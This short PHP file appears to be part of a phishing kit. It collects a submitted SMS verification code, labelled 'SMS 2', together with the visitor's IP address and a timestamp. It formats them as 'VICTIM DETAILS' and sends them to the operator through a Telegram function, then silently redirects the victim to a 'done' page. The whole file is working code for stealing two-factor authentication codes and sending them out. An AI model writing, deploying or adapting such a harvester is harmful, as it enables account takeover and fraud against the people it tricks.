<?php
include("../settings.php");
$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$hostname = gethostbyaddr($ip);
$message = " ▪️ 💻 VICTIM DETAILS 💻  \n";
$message .= "▪ ️SMS 2 " . $_POST['code'] . "\n";
$message .= "▪️ IP INFO : " . $ip . "\n";
$message .= "▪️ Date/Time  " . $date . "\n";
$message .= "▪️ 🥷🥷 Musa 🥷🥷   \n";
telegram($message);
echo "<meta http-equiv='refresh' content='0; url=../done.php'/>";


?>